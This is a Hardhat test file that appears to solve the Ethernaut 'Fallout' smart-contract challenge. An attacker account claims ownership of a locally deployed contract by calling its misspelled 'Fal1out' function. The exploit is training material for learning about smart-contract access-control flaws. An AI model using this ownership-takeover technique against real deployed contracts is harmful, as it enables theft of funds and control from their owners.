const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallout", async function () {
  before(async function () {
    this.falloutFactory = await ethers.getContractFactory("Fallout");
  });
  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();
    this.owner = owner;
    this.attacker = attacker;

    //deploy the contract as owner
    this.falloutContract = await this.falloutFactory.deploy();
    await this.falloutContract.deployed();
  });

  it("Attacker should not be the owner initially", async function () {
    expect(await this.falloutContract.owner()).to.not.equal(
      this.attacker.address
    );
  });

  it("Should be able to claim the ownership of the contract", async function () {
    // connect to the contract with the attacker account
    this.falloutContract = await this.falloutContract.connect(this.attacker);

    // Claim ownership by calling the misspelled Fal1out method
    await this.falloutContract.Fal1out({
      value: ethers.utils.parseEther("0.1"),
    });

    // check if the attacker is now owner
    expect(await this.falloutContract.owner()).to.equal(this.attacker.address);
  });
});
